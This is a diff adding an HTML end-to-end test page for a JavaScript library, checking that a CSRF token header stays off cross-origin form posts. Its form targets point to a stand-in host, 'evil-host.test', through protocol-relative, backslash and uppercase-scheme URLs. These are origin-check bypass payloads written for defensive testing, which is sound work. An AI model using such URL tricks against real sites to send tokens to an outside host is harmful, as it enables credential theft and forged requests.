@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Security F2 — CSRF token cross-origin leak — NoJS E2E</title>
+  <style>
+    body { font-family: sans-serif; margin: 2rem; color: #333; }
+    section { border: 1px solid #ccc; padding: 1rem; margin-bottom: 1rem; border-radius: 4px; }
+    .test-label { font-weight: 600; margin: 0 0 0.5rem; color: #555; }
+  </style>
+</head>
+<body>
+
+  <!-- F2: the X-CSRF-Token header must NOT be attached to cross-origin requests
+       reached via // , \\ or HTTP:// URLs; it MUST still attach to same-origin
+       non-GET requests, and NEVER to GET requests. -->
+
+  <!-- Cross-origin: protocol-relative -->
+  <section>
+    <p class="test-label">POST // (protocol-relative, cross-origin)</p>
+    <form post="//evil-host.test/leak-proto" success="proto-tpl">
+      <input type="hidden" name="x" value="1" />
+      <button type="submit" data-test="f2-post-proto">go</button>
+    </form>
+    <template id="proto-tpl"><span data-test="f2-proto-done">done</span></template>
+  </section>
+
+  <!-- Cross-origin: backslash authority -->
+  <section>
+    <p class="test-label">POST \\ (backslash, cross-origin)</p>
+    <form post="\\evil-host.test/leak-back" success="back-tpl">
+      <input type="hidden" name="x" value="1" />
+      <button type="submit" data-test="f2-post-back">go</button>
+    </form>
+    <template id="back-tpl"><span data-test="f2-back-done">done</span></template>
+  </section>
+
+  <!-- Cross-origin: uppercase scheme -->
+  <section>
+    <p class="test-label">POST HTTP:// (uppercase scheme, cross-origin)</p>
+    <form post="HTTP://evil-host.test/leak-upper" success="upper-tpl">
+      <input type="hidden" name="x" value="1" />
+      <button type="submit" data-test="f2-post-upper">go</button>
+    </form>
+    <template id="upper-tpl"><span data-test="f2-upper-done">done</span></template>
+  </section>
+
+  <!-- Control: same-origin non-GET MUST carry the token -->
+  <section>
+    <p class="test-label">POST /api (same-origin control — token expected)</p>
+    <form post="/api/f2-same-origin" success="same-tpl">
+      <input type="hidden" name="x" value="1" />
+      <button type="submit" data-test="f2-post-same">go</button>
+    </form>
+    <template id="same-tpl"><span data-test="f2-same-done">done</span></template>
+  </section>
+
+  <!-- Control: GET MUST never carry the token -->
+  <section>
+    <p class="test-label">GET /api (control — no token ever)</p>
+    <div get="/api/f2-get" as="g" success="get-tpl">
+      <span data-test="f2-get-slot" bind="g.ok"></span>
+    </div>
+    <template id="get-tpl"><span data-test="f2-get-done">done</span></template>
+  </section>
+
+  <script src="../../dist/iife/no.js"></script>
+  <script>
+    NoJS.config({ csrf: { token: 'CSRF_SECRET_TOKEN' } });
+    NoJS.init();
+  </script>
+</body>
+</html>
